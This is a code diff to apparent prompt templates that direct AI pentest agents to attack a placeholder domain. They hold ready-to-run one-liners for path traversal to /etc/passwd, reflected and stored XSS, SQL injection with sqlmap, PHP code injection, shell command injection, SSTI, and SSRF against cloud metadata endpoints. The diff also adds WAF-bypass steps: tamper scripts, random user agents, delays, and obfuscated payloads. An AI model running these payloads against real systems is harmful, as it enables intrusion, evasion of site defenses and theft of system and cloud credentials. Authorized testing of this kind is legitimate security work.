@@ -427,7 +427,7 @@ You are the WSTG-ATHZ agent. Target: {{domain}}
 CRITICAL: Every curl MUST have -L -4 -A "{_BUA}" — without -L, Cloudflare returns 301s.
 
 [ATHZ-01] Directory Traversal / File Include
-  python3 -c "import subprocess; ua='{_BUA}'; payloads=['/../../../etc/passwd','/%2e%2e/%2e%2e/etc/passwd','/..%2f..%2fetc%2fpasswd','/?file=../../etc/passwd','/?path=../etc/passwd','/?page=../../../../etc/passwd']; [print(r.returncode,p,(lambda b: 'HIT:'+b[:80] if 'root:' in b or '/bin/' in b else b[:40])(subprocess.run(['curl','-L','-4','-sk','--max-time','8','-A',ua,'https://{{domain}}'+p],capture_output=True,text=True,timeout=12).stdout)) for p in payloads]"
+  python3 -c "import subprocess; ua='{_BUA}'; payloads=['/../../../etc/passwd','/%2e%2e/%2e%2e/etc/passwd','/..%2f..%2fetc%2fpasswd','/?file=../../etc/passwd','/?path=../etc/passwd','/?page=../../../../etc/passwd']; [print('HIT PATH TRAVERSAL:' if any(x in b for x in ['root:x:0','root:!:','bin:x:1']) else 'OK ('+str(len(b))+' bytes)',p) for p in payloads for b in [subprocess.run(['curl','-L','-4','-sk','--max-time','8','-A',ua,'https://{{domain}}'+p],capture_output=True,text=True,timeout=12).stdout]]"
 
 [ATHZ-02] Bypassing Authorization Schema
   for ep in /api/users /api/admin /admin/ /admin/dashboard; do curl -L -4 -si https://{{domain}}$ep -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 8 2>/dev/null | head -5; echo "--- $ep ---"; done
@@ -499,6 +499,15 @@ You are the WSTG-INPV agent. Target: {{domain}}
 
 CRITICAL: Use subprocess curl (NOT urllib — urllib stalls on VPS SSL). Every curl needs -L -4 -A "{_BUA}".
 
+WAF BYPASS: If you get 403/429 responses, the target has a WAF. Before retrying:
+1. Add random delays (time.sleep(1)) between requests
+2. Use sqlmap tamper scripts: --tamper=between,randomcase,space2comment --delay=2 --random-agent
+3. Try lowercase/mixed-case payloads: <ScRiPt>, SeLeCt instead of SELECT
+4. Use URL encoding variants: %3cscript%3e, %27 OR %271%27=%271
+5. Fragment payloads with comments: SE/**/LECT, <sc/**/ript>
+6. After WAF bypass, VERIFY injections: a phpinfo() hit is ONLY confirmed if the response
+   contains the actual PHP info table (PHP Version header row), NOT just the word 'phpinfo' echoed back.
+
 [INPV-01] Reflected XSS
   python3 -c "import subprocess,urllib.parse; ua='{_BUA}'; payloads=['<script>alert(1)</script>','\\'><img src=x onerror=alert(1)>','<svg onload=alert(1)>']; params=['q','search','s','query','keyword','name','input']; run=lambda u: subprocess.run(['curl','-L','-4','-sk','--max-time','8','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt',u],capture_output=True,text=True,timeout=12).stdout[:3000]; [print('REFLECTED XSS:',u) if any(p in run(u) for p in payloads) else None for pr in params for pl in payloads for u in ['https://{{domain}}/?'+pr+'='+urllib.parse.quote(pl)]]"
 
@@ -506,17 +515,20 @@ CRITICAL: Use subprocess curl (NOT urllib — urllib stalls on VPS SSL). Every c
   for ep in /comment /review /contact /feedback /post /message; do code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" -X POST "https://{{domain}}$ep" -d "comment=<script>alert(xss_test)</script>&name=tester&email=t@mailinator.com" -H "Content-Type: application/x-www-form-urlencoded" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 8 2>/dev/null); [ "$code" != "404" ] && [ "$code" != "000" ] && echo "$code POST $ep"; done
 
 [INPV-05] SQL Injection
-  sqlmap -u "https://{{domain}}/?id=1" --batch --level=1 --risk=1 --timeout=20 --output-dir=/tmp/sqli_{{domain}} 2>/dev/null | tail -15 || echo "(sqlmap fallback)"
-  python3 -c "import subprocess,urllib.parse; ua='{_BUA}'; errors=['sql syntax','mysql error','ora-0','sqlite_','pg_query','postgresql error','syntax error near','unclosed quotation']; payloads=[chr(39),'1 OR 1=1','1 UNION SELECT 1--',\"1' ORDER BY 1--\"]; params=['id','cat','page','product','item','user']; run=lambda u: subprocess.run(['curl','-L','-4','-sk','--max-time','10','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt',u],capture_output=True,text=True,timeout=14).stdout.lower(); [print('SQL ERROR:',u) for pr in params for pl in payloads for u in ['https://{{domain}}/?'+pr+'='+urllib.parse.quote(pl)] if any(e in run(u) for e in errors)]"
+  sqlmap -u "https://{{domain}}/?id=1" --batch --level=1 --risk=1 --timeout=20 --random-agent --delay=2 --tamper=between,randomcase,space2comment --ignore-code=403,429 --output-dir=/tmp/sqli_{{domain}} 2>/dev/null | tail -20 || echo "(sqlmap not available)"
+  python3 -c "import subprocess,urllib.parse,time; ua='{_BUA}'; errors=['sql syntax','mysql error','ora-0','sqlite_','pg_query','postgresql error','syntax error near','unclosed quotation']; payloads=[chr(39),'1 OR 1=1','1 UNION SELECT 1--']; params=['id','cat','page','product','item','user']; run=lambda u: (time.sleep(0.5) or subprocess.run(['curl','-L','-4','-sk','--max-time','10','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt',u],capture_output=True,text=True,timeout=14).stdout.lower()); [print('SQL ERROR:',u) for pr in params for pl in payloads for u in ['https://{{domain}}/?'+pr+'='+urllib.parse.quote(pl)] if any(e in run(u) for e in errors)]"
 
 [INPV-11] Code Injection
-  python3 -c "import subprocess,urllib.parse; ua='{_BUA}'; payloads=['phpinfo()','system(id)','passthru(id)']; params=['page','template','include','module','file','action','view']; run=lambda u: subprocess.run(['curl','-L','-4','-sk','--max-time','8','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt',u],capture_output=True,text=True,timeout=12).stdout; [print('CODE INJECTION:',u) for pr in params for pl in payloads for u in ['https://{{domain}}/?'+pr+'='+urllib.parse.quote(pl)] if any(x in run(u) for x in ['uid=','PHP Version','phpinfo','root:','www-data'])]"
+  # IMPORTANT: Only flag as confirmed if response contains ACTUAL PHP execution output,
+  # NOT just the word 'phpinfo' echoed back from the URL. Look for PHP Version table rows.
+  python3 -c "import subprocess,urllib.parse,time; ua='{_BUA}'; payloads=['phpinfo()','system(id)','passthru(id)']; params=['page','template','include','module','file','action','view']; run=lambda u: (time.sleep(0.3) or subprocess.run(['curl','-L','-4','-sk','--max-time','8','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt',u],capture_output=True,text=True,timeout=12).stdout); [print('CODE INJECTION CONFIRMED:',u) for pr in params for pl in payloads for u in ['https://{{domain}}/?'+pr+'='+urllib.parse.quote(pl)] for body in [run(u)] if any(x in body for x in ['uid=0(','uid=1(','PHP Version </td>','<title>phpinfo()</title>','System </td>','www-data</td>'])]"
 
 [INPV-12] Command Injection
-  python3 -c "import subprocess,urllib.parse,time; ua='{_BUA}'; payloads=['; id','| id','; whoami','& whoami']; params=['ip','host','cmd','exec','command','ping','target']; run=lambda u: (lambda t0: (subprocess.run(['curl','-L','-4','-sk','--max-time','10','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt',u],capture_output=True,text=True,timeout=14).stdout, time.time()-t0))(__import__('time').time()); [print('CMD INJECTION:',u,body[:80]) for pr in params for pl in payloads for u in ['https://{{domain}}/?'+pr+'='+urllib.parse.quote(pl)] for body,elapsed in [run(u)] if 'uid=' in body or 'root' in body]"
+  python3 -c "import subprocess,urllib.parse,time; ua='{_BUA}'; payloads=['; id','| id','; whoami','& whoami']; params=['ip','host','cmd','exec','command','ping','target']; run=lambda u: (time.sleep(0.3) or subprocess.run(['curl','-L','-4','-sk','--max-time','10','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt',u],capture_output=True,text=True,timeout=14).stdout); [print('CMD INJECTION:',u,body[:120]) for pr in params for pl in payloads for u in ['https://{{domain}}/?'+pr+'='+urllib.parse.quote(pl)] for body in [run(u)] if 'uid=0(' in body or 'uid=1(' in body or ('root' in body and '/bin/' in body)]"
 
 [INPV-18] Server-Side Template Injection (SSTI)
-  python3 -c "import subprocess,urllib.parse; ua='{_BUA}'; payloads=['{{{{7*7}}}}','${{7*7}}','#{{7*7}}','<%= 7*7 %>']; params=['name','template','greeting','msg','text','q','search']; run=lambda u: subprocess.run(['curl','-L','-4','-sk','--max-time','8','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt',u],capture_output=True,text=True,timeout=12).stdout; [print('SSTI HIT (7*7=49):',u,'payload:',pl) for pr in params for pl in payloads for u in ['https://{{domain}}/?'+pr+'='+urllib.parse.quote(pl)] if '49' in run(u)]"
+  # Note: $-sign payloads are built with chr(36) to avoid shell Bad substitution
+  python3 -c "import subprocess,urllib.parse,time; ua='{_BUA}'; payloads=['{{{{7*7}}}}',chr(36)+chr(123)+'7*7'+chr(125),'#{{{{7*7}}}}','<%= 7*7 %>']; params=['name','template','greeting','msg','text','q','search']; run=lambda u: (time.sleep(0.3) or subprocess.run(['curl','-L','-4','-sk','--max-time','8','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt',u],capture_output=True,text=True,timeout=12).stdout); [print('SSTI HIT (7*7=49):',u,'payload:',pl) for pr in params for pl in payloads for u in ['https://{{domain}}/?'+pr+'='+urllib.parse.quote(pl)] for body in [run(u)] if '49' in body and '49' not in pr]"
 
 [INPV-19] Server-Side Request Forgery (SSRF)
   python3 -c "import subprocess,urllib.parse; ua='{_BUA}'; params=['url','path','redirect','uri','dest','target','src','callback','webhook','fetch','proxy']; dsts=['http://169.254.169.254/latest/meta-data/','http://127.0.0.1/','http://localhost/']; run=lambda u: subprocess.run(['curl','-L','-4','-sk','--max-time','8','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt',u],capture_output=True,text=True,timeout=12).stdout; [print('SSRF HIT:',u) for pr in params for dst in dsts for u in ['https://{{domain}}/?'+pr+'='+urllib.parse.quote(dst)] if any(x in run(u) for x in ['ami-id','instance-id','local-ipv4','root:x:0'])]"
